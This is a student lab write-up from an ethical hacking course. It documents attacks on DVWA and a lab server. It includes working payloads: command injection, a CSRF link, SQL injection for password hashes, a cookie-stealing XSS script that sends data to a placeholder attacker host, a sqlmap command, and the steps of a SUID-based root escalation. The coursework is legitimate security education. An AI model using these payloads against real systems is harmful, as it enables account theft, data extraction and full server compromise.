# Lab 3 – Web Application Attacks

**Course:** Ethical Hacking (GDT3CR)  
**Platform:** VirtualBox / Raspberry Pi 4  
**Operating System:** Kali Linux  
**User:** freesensei

---

# 3.1 Damn Vulnerable Web Application (DVWA)

## 3.1a Brute Force

### Goal
To crack the login mechanism by systematically testing passwords from a wordlist.

### Tools Used
- **Burp Suite Professional/CE** (Intruder)

### Description
The login request (GET request) was intercepted using Burp's "Intercept" and sent to **Intruder**. An attack was configured with a wordlist containing the 10,000 most common passwords. A grep match was used to identify the specific text or response length the server returns upon successful login.

![Brute Force Attack in Burp Suite](Screenshots/DVWA_Brute_Force.png)

---

## 3.1b Command Injection

### Goal
To achieve Remote Code Execution (RCE) and extract system information.

### Description
By exploiting an insecure ping form, system commands could be injected by separating them with a semicolon (;).

### Injected Payload
```bash
127.0.0.1; whoami; hostname; ifconfig; ls ~/
```

### Result
The output showed that the application was running as user `www-data` on the host `pentestserver`.

---

## 3.1c Cross Site Request Forgery (CSRF)

### Description
The vulnerability was exploited to force a logged-in user to change their password without consent.

### Example of Manipulated Link
```text
http://[target-ip]/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

---

## 3.1d File Inclusion & File Upload

### Local File Inclusion (LFI)
Through directory traversal, the URL was manipulated to read sensitive system files.

* **Result:** The file `/etc/passwd` was exposed.

### File Upload
A PHP script (`phpinfo.php.txt`) was uploaded to `../../hackable/uploads/`.

---

## 3.1e SQL Injection (SQLi)

### Goal
To extract user data and password hashes from the database.

### Injected SQL
```sql
' UNION SELECT user, password FROM users#
```

### Result
Hashes for users `admin`, `gordonb`, `1337`, `pablo`, and `smithy` were successfully extracted.

---

## 3.1f Cross-Site Scripting (XSS)

### Method
XSS was used to steal session cookies (`PHPSESSID`) from a user.

### Injected Payload
```html
<script>new Image().src="http://[attacker-ip]:1337/?cookie="+document.cookie;</script>
```

### Result
The session cookie was sent to the attacker's logging server.

---

# 3.2 Advanced Attacks (Target 1.2)

## 3.2a Blind SQL Injection via SQLmap

### Description
SQLmap automatically identified the `password` parameter as vulnerable to time-based blind SQL injection.

### Command Used
```bash
sqlmap -u "http://[target-ip]/login.php" --data="username=admin&password=1" -p password --dbms=mysql
```

---

## 3.2b Privilege Escalation (Root Compromise)

### Initial Access
A reverse shell was obtained via Remote File Inclusion (RFI).

### Escalation to Root
1. Identified a SUID file `/bin/cp`.  
2. Created a modified `/etc/passwd` with a new user having root privileges (UID 0).  
3. Used the SUID `cp` binary to overwrite the original system file.  
4. The command `su [username]` gave full root access to the server.

---

## 3.2c Revealed System Accounts and Passwords

* **User:** `bobby` | **Password:** [Fill in bobby's password]  
* **User:** `root` | **Password:** [Fill in root's password]

---

# 3.3 Lab Feedback

## Relevance
The lab was highly relevant and well connected to theoretical topics such as OWASP Top 10. It was particularly rewarding to exploit the full attack chain from an initial SQL injection to a complete reverse shell and privilege escalation to root.

## Suggestions for Improvement
Some tools’ syntax changes quickly over time. A troubleshooting guide for modern reverse shells would be helpful since NetCat's `-e` flag is often missing for security reasons.

---

## Ethical Disclaimer
All activity was conducted in a controlled lab environment for educational purposes only. No unauthorized systems were targeted.